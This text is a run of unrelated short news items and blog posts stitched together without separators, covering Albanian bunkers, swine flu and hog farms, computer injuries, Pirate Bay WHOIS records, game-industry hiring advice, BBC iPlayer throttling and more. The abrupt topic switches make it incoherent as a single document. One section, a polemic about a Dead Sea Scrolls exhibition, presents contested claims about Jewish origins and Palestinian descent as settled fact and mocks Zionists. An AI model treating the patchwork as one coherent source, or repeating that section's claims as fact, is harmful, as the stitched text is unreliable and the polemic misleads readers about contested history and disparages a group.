One of the coolest advertisements we ’ve seen lately is for Berger Paints .
In a billboard for their campaign titled , Natural Colours , a live painter appeared to be painting the blue of the sky onto the billboard .
It was achieved by cutting out strips that are the actual shape and size of the roller strokes .
This is stop - in - your - tracks advertising .
Love it !
More great stuff , creative and cool pillows .
For the first - time visitor to Albania it can be hard to shake off the feeling of being watched .
Since the fall of communism they have become the venue for lovers ' trysts - or homes for displaced people
As the country 's only dual - carriage way cuts a swathe through the dense countryside from the airport into Tirana , it slowly dawns on you that you are surrounded .
Looking down from every hillside , sprouting out of every bank , are the cracked and rusting domes of the defence bunkers - a concrete legacy of the paranoid imagination of Albania 's communist ruler for 40 years , Enver Hoxha .
More than 700,000 of these cement and iron monsters were built between 1950 and the dictator 's death in 1985 .
Maginot line
They cost more than twice as much as France 's infamous pre-WWII Maginot Line , and consumed more than three times as much concrete .
Built to repel the threat of foreign invasion - a constant fear of one of the world 's most isolationist Stalinists - the bunkers are an almost indestructible obstacle on the path to modernisation for Europe 's poorest country .
Since the fall of communism in 1991 they have abandoned their military duty to become the venue for lovers ' trysts and , in the most desperate cases , homes for the thousands of internally displaced people .
Precious few have been destroyed , though , and for that , as with so may things , the people have Mr Hoxha to thank .
Baptism by fire
When the prototype bunker was finished in the 1950s he asked the chief engineer how confident he was that it could withstand a full assault from a tank .
The answer was , " Very confident " .
The Communist Party supremo then insisted that the engineer stand inside his creation while it was bombarded by a tank .
Sadly for the current generation , the shell - shocked engineer emerged unscathed and his look - out posts went into production on a massive scale .
The Communist Party has now gone , as has the giant gilded statue of Hoxha from the main square of the capital , Tirana , but the bunkers remain and the prosperous future is nowhere in sight .
Football heroes
Not everyone is content to live in the grey shadow of these concrete clones and the former culture minister invited hundreds of artists and children to paint the bunkers between the airport and Tirana in the style of magic mushrooms .
However , the post - communist military could not countenance such a colourful break with the past and sadly blocked the scheme .
But the army can't stop everyone expressing themselves and , on a hillside outside the port of Durres , locals have daubed their cement domes with the names of their World Cup heroes .
Italy 's Alesandro Del Piero and Germany 's Miroslav Klose compete for pride of place in a testament to the current generation 's break with the paranoid isolation of the past .
What is believed to be the world 's first robot that comes to take away rubbish from your house when you want it to has been unveiled in Italy .
The Dustbot can be summoned to your address through a mobile phone any time of the day .
The robot works with a combination of GPS navigation and with a gyroscope to keep it upright .
There are also a number of sensors on the machine so it does not bump into anything .
Dustbot 's inventors say they hope it will put an end to fixed times for rubbish collection and they say it is designed to work in tightly packed urban areas where large refuse trucks find it difficult to operate .
A number of local authorities from around the world have already expressed an interest in it .
Duncan Kennedy went for a look at the prototype in Tuscany , Italy .
Palestinian Authority Prime Minister Salam Fayad has made a formal complaint to the Canadian government regarding the intention of Toronto ’s Royal Ontario Museum to collaborate with the Israel Antiquities Authority to host “ Dead Sea Scrolls : Words that Changed the World ” from June 27 to January 3 , 2010 .
Palestinian Archaeological Department Director - GeneralHamdan
Taha explains ,
“ The exhibition would entail exhibiting or displaying artifacts removed from the Palestinian territories ...
I think it is important that Canadian institutions would be responsible and act in accordance with Canada ’s obligations . ”
The Israeli exhibition violates international conventions or protocols that Canada has ratified and that protect cultural property during armed conflict .
The State of Israelseized the Jordanian - owned Rockefeller Museum in Jerusalem in 1967 to take possession of the scrollsand has continued to loot similar Palestinian cultural property from the Occupied Territories ever since .
Under the 1970 Convention on the Means of Prohibiting and Preventing the Illicit Import , Export and Transfer of Ownership of Cultural Property and the 1954 Hague Convention along with its two associated protocols , Canada is legally obliged “ to take appropriate steps to recover and return any such cultural property ” at the request of the wronged party .
The Dead Sea Scrolls exhibition is part of Israel ’s effort to re-brand itself .
According to The Economist , American Jewish groups and Israeli diplomats are trying to create the perception of Israel as “ hip , cool , cultured , fun and creative . ”
The campaign has included placing sexually suggestive advertisements in Maxim and other men ’s magazines .
Harvard Professor Stephen
Walt suggests in his Foreign Policy blog that the re-branding effort is foredoomed to failure : “ Restoring Israel ’s image in the West is n’t a matter of spin or PR or ‘ re - branding ; ’ it ’s a matter of abandoning the policies that have cost it the sympathy it once enjoyed .
It ’s really just about that simple . ”
The archaeological component of the propaganda campaign , however , uses subliminal suggestion to bypass such political arguments .
A top Israeli re-branding advocate argues , “ [ Let ’s ] get to that first stage when people associate Israel with science and music and archaeology ... Then we ’ll take it from there . ”
In Facts on the Ground Columbia Professor Nadia Abu Al Haj writes , “ In the context of Israel and Palestine , archaeology emerged as a central scientific discipline because of the manner in which colonial settlement was configured in a language of , and a belief in , Jewish national return . ”
Even though asserting ownership to a country after absence of 2000 years is preposterous , Israel ’s theft of Palestine from the native population is popularly legitimised through the claim that today ’s Jews descend from inhabitants of Greco - Roman Judea .
According to New York Times Reporters Ethan Bonner and Isabel Kershner in “ Parks Fortify Israel ’s Claim to Jerusalem , ” “ [ There ] is a battle for historical legitimacy .
As part of the effort , archaeologists are finding indisputable evidence of ancient Jewish life here . ”
This claimis nonsense .
Intellectuals of Jewish origin in 19th century Germany , influenced by the folk character of German nationalism , invented their folk narratives ‘ retrospectively , ’ out of a thirst to create a modern Jewish people , argues Tel Aviv University Professor Shlomo Sand , author of How and When the Jewish People Was Invented .
There is no single founder population for modern Jewry any more than there is a single founder population for modern Christians or modern Muslims .
Late ancient and early medieval texts describe an ethnically diverse collection of communities associated with proselytizing pre-Rabbinic Judaism .
In English to use the word Jew is anachronistic before the 10th century when medieval Rabbinic Judaism crystallised thanks to the efforts of Saadyah Gaon ( Sa‘îd bin Yûsuf al - Fayyûmi ) and his colleagues .
With the revolutionary codification of Rabbinic law these communities became part of a vast trade network that spanned the Christian and Muslim world and that extended into China and began to exchange members on a large scale .
The main population - exporting region seems to have been located in territories near the Black Sea .
Current genetic anthropological findings based on DNA analysis indicate that the male ancestors of Yiddish Jewry were of Eastern European and non-Levantine Southwest Asian origin while the female ancestors were Eastern Europeans .
Sand admits , “ [ The ] chances that the Palestinians are descendants of the ancient Judaic people are much greater than the chances that you or I [ meaning Israeli Jews ] are its descendents . ”
The Palestinians ’ ancestors created the Hasmonean Kingdom , composed the Hebrew Bible , followed Jesus , wrote the New Testament , compiled the Mishnah , and redacted the Jerusalem Talmud .
The Palestinian people constitute the living link to the earliest beginnings of the heritage from the Torah and Gospel .
Zionists are almost pitiable , for they are so ashamed of their own history that they have usurped one belonging to another people .
When the Israeli government sends the Dead Sea Scrolls to Canada , by its own law Canada must turn them over to their rightful owners — the Palestinian people .

Humans have it .
Pigs do n't .
At least not yet , and US pork producers are doing everything they can to make sure that the new H1N1 virus , known around the world as the " swine flu , " stays out of their herds .
Download the new Independent Premium app Sharing the full story , not just the headlines
" That is the biggest concern , that your herd could somehow contract this illness from an infected person , " said Kansas hog farmer Ron Suther , who is banning visitors from his sow barns and requiring maintenance workers , delivery men and other strangers to report on recent travels and any illness before they step foot on his property .
" If a person is sick , we do n't want you coming anywhere on the farm , " Suther said .
Those sentiments were echoed by producers around the nation this week as fears of a possible global flu pandemic grew , with more than 200 people sickened , including more than 100 in the United States , and at least 177 dead , all but one in Mexico .
" There is no evidence of this new strain being in our pig populations in the United States .
And our concern very much is we do n't want a sick human to come into our barns and transmit this new virus to our pigs , " said National Pork Producers chief veterinarian Jennifer Greiner .
" If humans give it to pigs , we do n't have things like Tamiflu for pigs .
We do n't have antivirals .
We have no treatment other than to give them aspirin , " said Greiner .
The World Health Organization on Thursday officially declared it would stop calling the new strain of flu " swine flu , " because no pigs in any country have been determined to have the illness and the origination of the strain has not been determined .
The never - before - seen H1N1 flu virus has elements of swine , avian and human varieties .
Still , US hog farmers said flu fears have hit them hard in the wallet as hog prices plummeted this week in response .
Many countries reacted to the outbreak earlier this week by banning pork or meat from US states that have human cases of the flu .
And Egypt ordered the slaughter of all pigs in the country as a precaution .
US hog producers have already been struggling financially for more than a year due to poor prices and high feed costs .
If the new flu strain does hit their herds , it could spur further price declines , and could potentially spread broadly through herds .
To try to protect against such a scenario , industry groups and veterinarians this week warned farmers to step up their biosafety protocols , keeping pigs in barns behind security fences with access by any outsiders extremely limited .
Purdue University veterinarian Sandy Amass said farmers should keep an eye on pigs for " coughing , runny nose , fever and a reduction in feed intake , " and to have the animals tested immediately if they exhibit such flu symptoms .

" Pigs get flu just like people get flu , " Amass said .
" We 're want to do everything possible so the pigs do n't get infected . "
For Carroll , Iowa , producer Craig Rowles that means if any of his workers feel sick , they are ordered to take time off work - paid - to keep them away from the pigs .
" It 's a real issue , " Rowles said .
" If the pigs get it , there is n't much we can do .
Water , aspirin , and bed rest , that 's all we 've got . "

NEW YORK ( Reuters Health ) -
As computers have become a staple in American homes , the rate of injuries from computer mishaps has grown as well -- particularly among young children , according to a study published Tuesday .
Between 1994 and 2006 , researchers found , there was a more than seven - fold increase in the number of Americans who visited an emergency room for a computer - related injury -- lacerations , abrasions and bruises being the most common .
Up to now , studies have focused on chronic injuries associated with computer use such as back pain , blurred vision and eczema of the fingers from mouse use .
However , accidents involving home computers have also increased .
Of all age groups , children younger than 5 had the highest injury rate , with many being hurt when they tripped over computer wires .
Regardless of the victim ’s age , home computers were most often to blame , rather than school or work computers , according to findings published in the American Journal of Preventive Medicine .
More than 90 percent of injuries happened at home -- which is notable , the researchers say , considering how common computers are in schools and the workplace .
That also means that families should take steps to protect themselves , according to Dr. Lara B. McKenzie of Nationwide Children ’s Hospital Center for Injury Research and Policy in Columbus , Ohio .
She suggests that parents keep all computer equipment on a stable piece of furniture , away from the edges of the surface and out of the reach of young children .
They should also keep children ’s play areas separated from the computer workstation , McKenzie told Reuters Health , and only allow younger children to use the computer with adult supervision .
Keeping the computer workstation out of walkways and against a wall can minimize the risk of people hitting the sharp edges of the equipment or knocking any computer parts off of the desk .
Families should also make sure the computer wires and cords are organized and secured , McKenzie said .
She and her colleagues found that about 43 percent of injuries to children younger than 5 happened when the child tripped over computer wires -- as did 38 percent of injuries to adults age 60 or older .
Across age groups , 37 percent of injuries were the result of a person “ hitting or getting caught ” on a computer part , while 21 percent of injury victims were hurt by falling computer equipment .
The findings are based on a government database of ER - treated injuries at roughly 100 U.S. hospitals .
Between 1994 and 2006 , an estimated
78,703 Americans were treated for a computer - related injury -- growing from 1,267 in 1994 to 9,279 in 2006 .
The increase in injuries actually outpaced the growth of home computer ownership during that period , McKenzie and her colleagues note .
While home ownership grew by 309 percent , the injury rate rose by 732 percent .

SAN FRANCISCO 
It seemed like a symbolic tipping point for the nation in August when , in the midst of record high gasoline prices and a presidential campaign , the Santa Barbara County Board of Supervisors abandoned its longtime opposition to offshore oil drilling .
But six months later , with oil prices less than half what they were last summer , the board met on the issue again on Tuesday and reverted to its traditional stance , approving a resolution against offshore drilling in federal waters by a 3 - to - 2 vote .
“ I just feel this is not our future , ” said Supervisor Doreen Farr , who voted for the resolution .
Santa Barbara ’s longstanding antipathy to drilling traces back to a huge 1969 oil spill off the city ’s coast that helped galvanize the environmental movement .
Ms. Farr , who won election to the board in November , replaced Brooks Firestone , who in August cast the decisive vote in favor of drilling .
At the time , Mr. Firestone , who did not seek re-election , cited the importance of drilling to the economy and to reducing the nation ’s dependence on foreign energy sources .
The Maine house voted today for LD 1020 to End Discrimination in Civil Marriage & Affirm Religious Freedom .
The bill has passed 89 - 58 , and an earlier bill passed the senate .
The bill now goes to the governors desk for approval before becoming law .
If the bill is signed into law , Maine will become the 5th state to legalize same - sex marriage , and the 2nd state to do by legislative process .
Share your views with the governor , tell him to sign marriage equality into law !

A gaze - tracking camera system analyses the gaze of CCTV operators as they work to highlight any neglected screens ( Image : fishmonk , stock.xchng )
Editorial : Who watches the watchers ?
AN ORWELLIAN nightmare it may be to many of us , but CCTV is a boat full of holes to the organisations that pay for it .
That ’s because the people watching CCTV images back in the control rooms often have too many screens to monitor at once , and so may miss the criminal or antisocial activities they are there to spot .

Travelers and tourists have long been perplexed by cords which hang from Italian bathrooms .
What happens if you pull them ?
Well , after being stormed by police while bored on the toilet , one curious ( and embarrassed ) woman recently found out .
Italian law actually requires that an emergency cord hang from all public toilets .
Basically , they are intended as the Italian version of the infamous “ I ’ve fallen and I ca n’t get up ” life alert system .
Ideally , if you pull the cord , someone of authority should immediately rush to your assistance .
Despite the law , there is apparently some ambiguity regarding the proper response if one is pulled .
Often times nothing happens at all , likely as a result of the ‘ never cry wolf ’ syndrome ( could there be anything more enticing to a prankster than a cord dangling over a toilet ? ) .
But for one traveler , who reported the incident via twitter ( @Moscerina ) – yes , twitter– pulling the cord prompted a machine - gun holding carabinieri to charge into the bathroom to investigate .
Yikes !
Although we suspect that this incident is the exception rather than the rule , it ’s enough for us to implore to all travelers : as a general rule , it ’s probably best to avoid pulling mysterious strings while tweeting on the loo .

The Pirate Bay recently got a new range of IPs and to everyone 's surprise they are now linked to several movie and music industry lawyers involved in the TPB trial .
According to the Pirate Bay's Wikipedia entry the change was due to a hostile takeover , but most people know better .
RIPE is the Internet registry that keeps track of all IP - addresses allocated in Europe .
When the Pirate Bay got a new range of IP - addresses this week , something odd happened .
Aside from the usual TPB ASCII art there was some unusual information added to the RIPE database .
According to the recently updated RIPE database entry , the Pirate Bay is now listed as a customer of Danowsky & Partner law firm ( who represented IFPI ) , Maqs Law Firm ( representing the MPAA ) and the Swedish anti-piracy bureau .
All three were involved in the recent trial , which led some to believe that they somehow gained control over the site .
This is nonsense of course .
So why is this info in there , some might wonder .
One explanation might be that during the Pirate Bay trial the prosecution used ( incorrect ) data from the RIPE database claiming that this was the absolute truth .
The Pirate Bay team probably put the lawyers ’ info in there themselves to show that this is not the case .
Indeed , there is no doubt that they will have a hard time selling this ‘ truth ’ to the public now , with their own names being featured in the recent entry .
TPB RIPE WHOIS
One of the other advantages of the new RIPE WHOIS is that the Pirate Bay team does n’t have to deal with any of the takedown requests anymore , as it states that all abuse email should be directed to the earlier mentioned law firms .
Aye , that will teach those landlubbers .
Update : The Pirate Bay is down at the moment due to technical problems , they will be back soon .
You might think your job sucks , but at least your boss was n't insane enough to remove all the chairs and install security so an alarm goes off if you do n't walk fast enough .

The president of Canon Electronics , Hisashi Sakamaki , is also the author of a book proposing some of the same measures he takes with his own company .
His theory is that forcing employees to stand not only saves money but increases productivity and enhances employee relationships .
In the hallway , if an employee walks slower than 5 meters every 3.6 seconds , an alarm and flashing lights are set off , reminding the poor startled worker that he's an inefficient waste of air .
Even better ( or worse ) , there 's a sign on the floor in said hallways that reads , " Let 's rush :
If we do n't , the company and world will perish . "
The big boss , as a reward for thinking up all this stuff , gets to lounge in a nice , relaxing chair .

Physicists and mathematicians who think about higher - dimensional spaces are , if they allow their interest to somehow become public knowledge , inevitably asked : " How can you visualize more than three dimensions of space ? "
There are at least three correct answers : ( 1 ) You can 't .
( 2 ) You do n't have to ; manipulating abstract symbols is enough to help you figure things out .
( 3 ) There are tricks to help you pseudo - visualize higher - dimensional objects by cleverly projecting them into three dimensions ; see here and here .
But really , why can't we visualize things in more than three dimensions of space ?
Could a Flatlander , living in a world with only two spatial dimensions , learn to visualize our three - dimensional world ?
Could we somehow , through practice or direct intervention in the brain , train ourselves to truly visualize more dimensions ?
I can think of a couple of explanations why it 's so hard , with different ramifications .
One would be simply that our imaginations are n't good enough to project our consciousness into a constructed world so very different from our own .
Could you , for example , really imagine what it 's like to live in two dimensions ?
Sure , you can visualize Flatland from the outside , but what about asking what it 's like to really be a Flatlander ?
The best I can do is to imagine a line , flickering with colors , surrounded by darkness on either side .
But the darkness is still there , in my imagination .
The other possible explanation is that the process of visualization takes up a three - dimensional space in our actual brain , preventing us from " tuning a dimensionality knob " on our imaginations .
The truth is certainly more complicated than that ( and I 'm not experts , so anyone who is should chime in ) ; the visual cortex itself is effectively two - dimensional , but somehow our brain reconstructs a three - dimensional image of the space around us .
Maybe this could be a new tantric discipline : visualization in higher dimensions .
Or maybe the Maharishi already offers a course ?
A Cumberland County judge this afternoon imposed a 5 - to 22 - month county prison term on a former Wormleysburg man who pleaded guilty to battering a 3 - year - old boy in September 2007 .
Police said Richard Blazevic Jr. , who now lives in Highspire , grabbed his ex-girlfriend 's son by the face and genitals because the tot had wet his bed .
Judge Kevin A . Hess said the abuse was designed to cause psychological as well as physical trauma .
Blazevic pleaded guilty to a simple assault charge in January .
The victim , now 5 , watched as Hess imposed the jail sentence .

i .A medical mystery worthy of Dr. House himself , my body is incredibly resistant to any and all forms of anesthetics -- why I could n't have come down with a much cooler mutant power , like that guy Mystery from VH1's The Pickup Artist , is a lament for another column .
Last week , I checked myself into a San Francisco medical center for outpatient surgery .
Fifteen injections and two hours in , I could still feel every little touch from every little metal instrument .
" We should stop , " the doctor warned .
But I just wanted to get it over with .
I should have stopped .
The pain was , in a word , indescribable - in a few words , the pain was worthy of a prescription for " The World 's Largest Vicodin . "
The doctor actually waved my payment .
" Let 's never talk about this to anyone , " he said .
" I do n't charge for torture . "
Not to worry , doc : Anybody who has ever gone through what passes as games industry interview process can tell you that there are worse ways to spend your time .
I 've heard it estimated that , at this very moment , some 12 % of North American game developers are out of work .
And I still say burn your resume .ii .
It 's not that I do n't feel for the interviewers .
Creating a good test for interviewing candidates is a lot like being the Dungeon Master in Dungeons and Dragons :
You sit for hours , carefully preparing your castle maps , monster encounters , and clever dialog for the surprise villain that will ultimately threaten the very fabric of the Elven queen 's gown , just to have the players ( the candidates ) decide that instead of saving the world , they would rather go to the beach and drink Kobold Kahlua .
Interviewer : " What 's your greatest strength ?
" Candidate : " I execute shit like shit 's a mass murderer in Texas .
" Interviewer : " What 's your greatest weakness ?
" Candidate : " I am a surprisingly weak interviewee : For all of my world - beater talents , people never seem to want to hire me .
" But , to be completely fair , you really can't compare Dungeons and Dragons to the interview process .
If you did compare Dungeons and Dragons to the interview process , resumes would be character sheets , and in Dungeons and Dragons , people actually read the character sheets .
" Send us your resume , " is pretty - much without fail the first request that you will receive when dealing with a company 's Human Resources department .
In most cases , you cannot visit to interview without having sent a resume ahead of you :
So why do we allow people to interview us without having read the resume that we sent ?iii .
Of course , The Simpsons ' Comic Book Guy might comment that , " Resumes are n't character sheets : Job descriptions are character sheets . "
Well , here 's a little tip for the Comic Book Guys of the world :
The only people who answer obsessively crafted job descriptions are kids out of college and mediocre performers .
Amazing talent already has a job , a job where amazing talent is kept busy with work that is both satisfying and challenging , a job where amazing talent is very , very well cared for - a job where even the masseurs have masseurs .
You might be saying to yourself , " Hey !
I 'm amazing talent and I 'm out of work ! "
Well , here 's a little test for you :
Can you snap your fingers to control the weather ?
Now that 's a talent !
Talent can't be taught :
You either have it , or you do n't .
The Comic Book Guys will say , " Opportunity and experience trump talent . "
And I say to the Comic Book Guys that what wereally want is somebody who has talent and has also had the opportunities and experience to develop talent :
That 's what makes " amazing talent .
" Too often , hiring policy dictates that if an amazing talent can't be found , a warm body will do - to the constant and quickening degrade of the organization .
To paraphrase the old venture capitalist saying , " A's attract A's ; B's attract J's through K's . "
Every warm body you seat lowers the value of your company .
It baffles me as to why companies will string along the warm - bodied while holding to hopes of finding an amazing talent :
When you discover a body that is warm , but not amazing , tell them , " No thanks . "
It also baffles me as to why companies will string along amazing talents , with no word , for days or even weeks , all because of some dumb - colored tape on hiring .
Uncertainty disturbs the colon , resulting in nasty bouts of mud butt :
You do n't want your future star performer stinking up all the chairs in your office once you finally get around to hiring him , do you ?
If you do n't want stinky chairs , make sure that somebody is contacting the candidates daily , letting them know where they stand until a trigger can be pulled or the gun unloaded .
Now you , with your amazing talent for algebra , might be thinking , " If amazing talent has a job where amazing talent is happy , it is impossible to hire amazing talent . "
Not exactly true .
Sometimes it 's the publisher , in the library , with the candlestick ; sometimes amazing talent 's husband has to move and so she goes too ; sometimes , for whatever reason , amazing talent is in the wind , looking for work .
Human capital is just as important a component of your business as is the amount of capital resources at your command :
Which is to say , a group of ten brilliant people in an empty room will beat the market - snot out of a group of ten dumb people charged with the management of a great product .
With this in mind , you should spare nothing to bring amazing talent onboard when presented with the opportunity to do so : Different people are motivated by different things , not always money , and the words , " We do n't pay in used Women 's Shoes , " should never cross your lips .
And are you seriously going to turn away amazing talent when , " We do n't have a position open at the moment " ?
The top organizations create a position when amazing talent becomes available - a position which will maximize the utility of amazing talent while trivializing amazing talent 's weaknesses .
Earlier I mentioned that I 've heard it estimated that 12 % of game developers are out of work .
Well , the AAA studios - you know who they are - are still hiring , growing organically .
I posted the availability of a former co-worker , one whom I consider to be most - amazing , to a private developer forum recently , and , within one day , the big - named studios were requesting his contact information .
I 've heard the story so many times that it has become almost as comical as my writing : " Our company has a new CEO , and we 've all been told to read From Good to Great . "
From Good to Great is a good book , but I wish these CEOs would force their employees to read something greater : Mavericks at Work , by Bill Taylor and Polly Labarre , is the best book on the subject of attracting and retaining human capital that I 've ever read .
In fact , a great deal of this section was inspired by that very book .
The authors suggest replacing your " Recruitment " with " Harassment " - make everybody in your organization responsible for identifying the amazing talent in your industry , and then stalk amazing talent with offers like some jilted - ex - lover .
At the very least , should amazing talent ever find itself out of work , amazing talent will be thinking of you .iv .
" You 're walking down the hall and BAM !
One of your employees , riding down the hall on a bicycle , smacks right into you !
What do you do ?
" This was one of my favorite questions to ask the people that could potentially become my bosses .
The answer that I was looking for is , " Why was my employee riding the bicycle indoors ? ' "
Before acting , great managers ask , " Why ? " ( I 've since found much sneakier ways of getting to , " Why ? " )
I 'm also on the lookout for pronouns :
Does the interviewer say , " I , " a lot , or does the interviewer say , " we ? "
There is no " I " in " team " - well , I guess there 's no , " we " in " team , " either .
But the " Wii " is the best - selling console of this generation .
Never , ever be afraid to throw questions at your interviewers :
You 're both the Dungeon Master , and do n't you forget it .
" The problem with resumes , " says Seth Godin , a globally recognized marketing mastermind and bald man , is that they are " just another reason for somebody to reject you . "
If you 're lucky enough to have your resume read by the people you are interviewing with , your luck might involve those people scanning your resume for key - words .
When , when , when will companies learn that just because people list " Python " on their resume , that does not mean that those people are very good at Python .
And just because somebody does not list Python on their resume does not mean that they are not amazing talent that can learn all there is to know about Python in two weeks .
The truth is that even amazing talent will not be ready to win swims in your organizational ocean without first acclimating to the weekly waters .
Education in America was conceived and founded mostly during the industrial revolution to be vocational - to prepare the populace for manual labor .
As we have transitioned into a knowledge - based economy , high - specialization has left us needing to learn on the job , even the amazingly talented .
Yes , even amazing talent has weaknesses - weaknesses which amazing talent is very self - aware of .
But top performers do n't psyche themselves out .
If you ask the Los Angeles Lakers ' Kobe Bryant what his weaknesses are , I 'm sure he could recount for you every last detail from muscle memory .
But I 'm also sure he would n't , " I 'm the Black Mamba : The deadliest animal alive . "
Kobe Bryant has had twenty - four fifty - plus - point games in his career , third only to Wilt Chamberlin and Michael Jordan .
When Kobe misses a shot , he does n't stop taking shots .
And if you are going to be taking shots , you 're going to need the ball .
The problem with job descriptions is that they always list what the candidate will be held responsible for , but almost never list what authority the candidate will be given , should the candidate be hired .
Responsibility is the converse of authority : Political science dictates that we should not beheld responsible for something over which we have no authority .
Find out what authority you will have to execute before signing on to a new position .v.
" Do n't make a resume : I do n't want you sending it around to other companies . "
This is unintentionally sound advice from a triple - A studio head - " unintentionally sound , " in that having a resume is a very bad idea .
Burn your resume , but never , never stop talking to people until you are signed .
Getting somebody to almost hire you is the easiest task in the world .
Social networking is all the rage these days , and yes , you can most - definitely use those weak connections in your network to tweet your way into a job .
Third - party validation is an invaluable tool for finding a new position , " I 've worked with this guy , and he 's like a suitcase nuclear device :
Put him down beside a problem and then bunker up , because there willbe nothing but the problem 's shadows on the wall .
" It always amazes me that companies fail to capitalize on , or even value , those weak connections once you have been hired .
Business development is not just for business developers , and having people out there , incessantly singing like angels about you and your operation , can pay off for you in very tangible ways .
I was having lunch with a friend , the president of a large gaming middleware operation ; he lamented the fact that his guys were not plugged - into the development community ; his competitors are talking to people constantly , both through private channels , and through industry celebrity , creating a greater perceived value for their services .
" But how do I test for social network when hiring somebody ? "
Well , it just so happens that there is no " Huge Social Network " column on the traditional resume .
Resumes are just that , traditional :
They all look the same .
You have your objectives , your skills , your work history , your references ( which are sometimes " available upon request " ) , but nothing that really says who you are or what is so special about you .
You know that the games that you work on have to have a zingy - something - special to succeed at market :
Why should you approach marketing yourself any differently ?
Do you really want to get in the same marching line as the other 12 % of the industry that is delivering objectives , skills , work history , and references ( which are sometimes " available on request " ) ?
Burn your resume .
Yes , you will eventually have to send something when asked , " Please send us your resume . "
Just make sure that that something is truly special , something that communicates not only who you are and where you have been , but also why you are truly special .
If you are thinking that there is nothing truly special about you , then you 're probably a corpse .
( Ha !
I got you :
If you 're a corpse , and you 're reading this , then that 's something truly special : Zombies are hot right now ! )
Maybe you are a bad ass Scrum Master ?
Include a Sprint Report .
Maybe you can beat Green Grass and High Tides on expert ?
Include a photo of you and your .
And , if your social network is truly overwhelming , make sure that 's reflected too .
Call your something a " Curriculum Vitae , " which is a term that sounds just plain fancy , and which wo n't make people on the receiving end balk when you do not send in a resume .
Make sure that whatever it is that you send looks as pretty as you possibly can make it .
Graphic Designers are like adulterers , in that everybody knows one : Do n't be shy about calling for help .vi.
I can't recommend working with recruiters :
In one of my worst recruiter experiences , a co-worker listed me as a reference to a recruiter , and that same recruiter immediately called me asking if I would be interested in the job for which my co-worker was interviewing .
If you are going to work with a recruiter , the only advice that I can give is to avoid working with multiple recruiters at the same time : Recruiters are like cats in that they feel they belong to the house rather than to the owners ; and they hate having their toes stepped on .
I can recommend working with agents , but I stress that working with agents is in no way essential to finding a great position .
One of the biggest differences between working with an agent and working with a recruiter is that an agent should be making a percentage of every penny you make from the agent 's work - this is the only way to align utilities to ensure that an agent performs for you .
If you are going to sign on with an agent , make sure that you deliver , in writing , the results you expect your agent to achieve , and instruct your agent that making a binding agreement without first clearing things through you is not permitted .
Once you 've hired an agent , bow out of any and all negotiations :
If a potential suitor calls you to complain about your agent , do n't panic :
It 's a negotiation tactic , called , " hitting the high hat , " and the intention is to freak you out .
Have them take it up with your agent .
Agents are like dogs , in that they 'll love you if you feed them regularly .
Make sure that you are on the phone with your agent at least once a week - if that time cannot be yielded , the agent is probably too busy to perform effectively for you .
And beware , there are a lot of companies out there who simply will not work with you if you have an agent - the old saying goes , " To get the money you want , you have to decide whose money you do n't want . "
Some agents , like IDEA 's Sean Kauppinen and indie agent / dev Dave Taylor , I can get on with , though .
Do n't place your fate solely in the hands of human resources departments , recruiters , or even agents .
You are ultimately responsible for feeding your mouth , and so , make sure you milk those weak social connections like a perverse dairy farmer .
Send your Curriculum Vitae everywhere , even to the loud neighbor against whom you filed a noise - complaint .
You never know .
The BBC has taken to complaining ( again ) about ISPs that interfere with its Internet iPlayer TV service — but " network management " rules in the UK mean that this sort of thing is just par for the course .
No need for network neutrality
The UK government is in the final stages of creation for its " Digital Britain " report , which will lay out positions on everything from file sharing to broadband .
Tucked into the report 's interim conclusions are a few nuggets about network neutrality , which has never generated the same heat and light in Europe as it has in the US .
The interim report says that " the Government has yet to see a case for legislation in favour of net neutrality .
In consequence , unless Ofcom find network operators or ISPs to have Significant Market Power and justify intervention on competition grounds , traffic management will not be prevented . "
Instead , ISPs are supposed to disclose clearly what sort of limits they impose on connections .
If consumers do n't like it , they can choose another ISP .
Taking full advantage of the ability to limit Internet connections is BT , which applies traffic management with gusto .
Bandwidth caps ?
Check .
P2P throttling ?
Check .
Throttling of legal streaming video services ?
Check .
Throttling of " heavy users , " even those on unlimited monthly data plans ?
Check .
The BBC does n't like it , since the throttling allegedly affects the Beeb 's own iPlayer " catch - up " Internet service , which offers UK citizens the chance to watch BBC shows online after they have already aired .
ISPs do n't want iPlayer traffic clogging the tubes , and they 've been making noise about it for years .
Back in 2007 , some tried to squeeze the BBC for cash because of all the traffic iPlayer was generating .
BT 's own " fair usage policy " makes all of the restrictions clear , though the company takes issue with any suggestion that it is degrading iPlayer quality .
" We do not impose any restrictions that affect the viewing quality of services such as BBC iPlayer or Catch Up on Channel4.com or ITV.com , as these stream at up to 800 Kbps , " says BT .
" However , we do limit the speed of all video streaming to 896 Kbps on our Option 1 product , during peak times only , which is between 5 pm - midnight every day . "
But the BBC says that iPlayer operates at three different speeds , with the top one topping out at 1.5 Mbps .
Those that do n't like " Option 1 " — a 10 GB / month plan with P2P throttling , heavy usage throttling , and video streaming limits — can upgrade to a higher - priced plan that " only " has P2P throttling , heavy usage throttling , and a 20 GB / month allowance .
Or they can choose an unlimited data plan ... with P2P throttling and heavy usage throttling .
Or they can choose another ISP altogether .
The restrictions are all laid out on the company 's website , which makes them totally legal .
The approach to this issue taken by UK telecoms regulator Ofcom has been a voluntary code of practice for ISPs that makes sure all speed limits are clear .
" ISPs must use their best endeavours to set out clearly , and in a prominent place on their websites ( e.g. within help or FAQs sections ) , information relating to their respective policies on fair usage , " says the code .
The BBC might not like it , but in the UK , this is more a business dispute and matter of public pressure than it is a matter of law .
In the US , by contrast , attempts to impose even one of these restrictions have been met with strong statements from legislators and even direct intervention in particular cases .
Heck , we even have a President who is the " Net Neutralist in Chief . "
The UK approach is in part a product of the country 's approach to competition .
Mandatory line - sharing rules mean that there is more competition among DSL providers than exists in the US , but it 's still worth wondering if some form of baseline service requirements might be useful .
The throttling of specific protocols , for instance , could have a dramatic effect on innovation ; what new company will try to launch a new HD streaming site , for instance , if it knows that several of the country 's largest ISPs will throttle the service during peak hours — even though they sell their customers 8 M bps connections ?
There are three types of bicycles :
There ’s the kind of bike built for riding on the roads , there ’s the kind of bike built for riding on the trails , and there ’s the kind of bike built for storing in my garage .
When my friend Joel offered to let me ride with his “ Morning Road Bike Club , ” I very enthusiastically declined .
I explained to him that there is just something offensive to me about the word “ morning . ”
Besides , owning my kind of bicycle means that its tires are flat and also I have n’t even seen the thing since 1997 .
It ’s buried under all the stuff that my children have lent me to store in my garage so that I wo n’t have to go through the hassle of parking my car in there .
Joel said he could lend me everything I needed and that , once I tried the sport , I would be hooked .
“ Hooked ” is a term that comes from the act of impaling a fish in its lip and yanking it out of the water .
I had to agree that this was the only way I would get out of bed to ride a bicycle .
